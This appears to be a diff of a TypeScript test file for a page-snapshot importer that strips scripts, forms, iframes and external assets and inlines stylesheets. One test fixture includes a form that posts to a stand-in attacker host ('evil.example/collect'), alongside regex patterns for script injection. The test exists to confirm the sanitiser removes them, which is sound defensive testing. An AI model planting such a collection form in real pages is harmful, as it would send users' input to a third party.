@@ -92,7 +92,7 @@ test("robots.txt is fetched once per host per hour; 404 allows, 5xx disallows", 
   assert.deepEqual(await robotsFor(new URL("https://down.github.io/"), { fetcher: failing(503), now }), { unreachable: true });
 });
 
-test("a rendered page becomes a script-free snapshot bundle with provenance and a warning", async () => {
+test("a rendered page becomes one script-free static page with provenance and a warning", async () => {
   let rendering = 0;
   const result = await captureRendered(PAGE, {
     onRendering: async () => void rendering++,
@@ -107,16 +107,57 @@ test("a rendered page becomes a script-free snapshot bundle with provenance and 
   assert.equal(result.title, "Demo app");
   assert.equal(result.manifest.provenance.renderer, "headless-snapshot-v1");
   assert.equal(result.manifest.provenance.sourceUrl, PAGE);
-  assert.ok(result.warnings.includes(SNAPSHOT_WARNING));
-  assert.equal(result.previewReady, true, JSON.stringify(result.warnings));
+  assert.deepEqual(result.warnings, [SNAPSHOT_WARNING]);
+  // One self-contained page the static viewer shows as is: the job is ready without an interactive build.
+  assert.equal(result.files.length, 1);
+  assert.equal((result as { staticReady?: boolean }).staticReady, true);
   const parsed = validateAgentCapture(
     { key: randomUUID(), title: result.title, manifest: result.manifest, files: result.files },
     "capture",
   );
   const html = parsed.source.get("index.html")!.toString();
   assert.match(html, /Rendered/);
-  for (const gone of [/<script/i, /<noscript/i, /onclick/i, /javascript:/i]) assert.doesNotMatch(html, gone);
-  assert.ok([...parsed.source.values()].some((bytes) => bytes.toString() === "h1{color:teal}"), "CSS localised");
+  for (const gone of [/<script/i, /<noscript/i, /onclick/i, /javascript:/i, /<link/i]) assert.doesNotMatch(html, gone);
+  assert.match(html, /<style>h1\{color:teal\}<\/style>/, "the stylesheet is inlined");
+});
+
+test("a snapshot keeps the page when parts of it cannot be copied", async () => {
+  const result = await captureRendered(PAGE, {
+    render: async () =>
+      snapshot(
+        '<!doctype html><title>x</title><link rel="stylesheet" href="/assets/index.css"><link rel="stylesheet" media="print" href="/print.css">' +
+          '<style>.bg{background:url("https://cdn.example.org/b\\61 g.png")} .ok{color:red}</style>' +
+          '<form action="https://evil.example/collect" method="post"><label>Name <input name="n"></label><button>Send</button></form>' +
+          '<img src="https://fonts.example.org/l/font?kit=1"><img data-src="https://cdn.example.org/lazy.png" src="/logo.png">' +
+          '<svg><image src="https://ssl.example.org/icon.png"/></svg><iframe src="https://embed.example.org/"></iframe>' +
+          "<main><h1>Plan</h1><p>" + "A long enough paragraph of the page. ".repeat(4) + "</p></main>",
+      ),
+    fetcher: async (url) => {
+      if (url === "https://demo.lovable.app/assets/index.css") return { url, contentType: "text/css", bytes: Buffer.from("h1{color:teal}") };
+      if (url === "https://demo.lovable.app/logo.png")
+        return { url, contentType: "image/png", bytes: Buffer.from("89504e470d0a1a0a0000000d49484452", "hex") };
+      // A font service answering HTML to a non-browser: the image is left out, not the page.
+      if (url.startsWith("https://fonts.example.org/")) return { url, contentType: "text/html", bytes: Buffer.from("<html>") };
+      throw Error(`unexpected ${url}`);
+    },
+  });
+  const html = Buffer.from(result.files[0].data, "base64").toString();
+  assert.equal(result.files.length, 1);
+  assert.equal((result as { staticReady?: boolean }).staticReady, true, JSON.stringify(result.warnings));
+  assert.doesNotMatch(html, /<form|<iframe|print\.css|evil\.example|https:\/\/(?:fonts|cdn|ssl)\.example\.org/);
+  assert.match(html, /<div><label>Name/);
+  assert.match(html, /src="data:image\/png;base64,/);
+  assert.match(html, /\.ok\{color:red\}/);
+  for (const warning of [/iframe/, /escape/, /ресурсы страницы не сохранились/])
+    assert.ok(result.warnings.some((w) => warning.test(w)), `${warning}: ${JSON.stringify(result.warnings)}`);
+  // A plain import (not a snapshot) still refuses the same page.
+  const { captureHtmlDocument } = await import("../apps/server/url-import/html-capture.ts");
+  await assert.rejects(
+    captureHtmlDocument({ url: PAGE, contentType: "text/html", bytes: Buffer.from('<img src="https://fonts.example.org/l/font?kit=1">') }, {
+      fetcher: async (url) => ({ url, contentType: "text/html", bytes: Buffer.from("<html>") }),
+    }),
+    { code: "unsupported_asset" },
+  );
 });
 
 test("the renderer's refusals stop an import; nothing is retried", async () => {
